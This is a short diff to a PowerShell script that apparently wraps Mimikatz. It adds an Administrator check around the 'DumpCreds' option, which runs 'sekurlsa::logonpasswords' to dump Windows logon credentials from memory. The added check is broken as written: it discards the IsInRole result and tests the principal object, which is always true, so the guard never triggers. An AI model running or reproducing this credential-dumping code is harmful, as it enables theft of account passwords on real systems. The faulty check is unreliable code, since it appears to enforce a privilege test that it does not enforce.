@@ -2707,7 +2707,16 @@ Function Main
 
     if ($PsCmdlet.ParameterSetName -ieq "DumpCreds")
     {
-        $ExeArgs = "sekurlsa::logonpasswords exit"
+		$currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
+		$currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+		if ($currentPrincipal){
+			$ExeArgs = "sekurlsa::logonpasswords exit"
+		}
+		else{
+			Add-Type -AssemblyName PresentationFramework;
+			[System.Windows.MessageBox]::Show('You have to be Administrator');	
+			return;
+		}
     }
     elseif ($PsCmdlet.ParameterSetName -ieq "DumpCerts")
     {
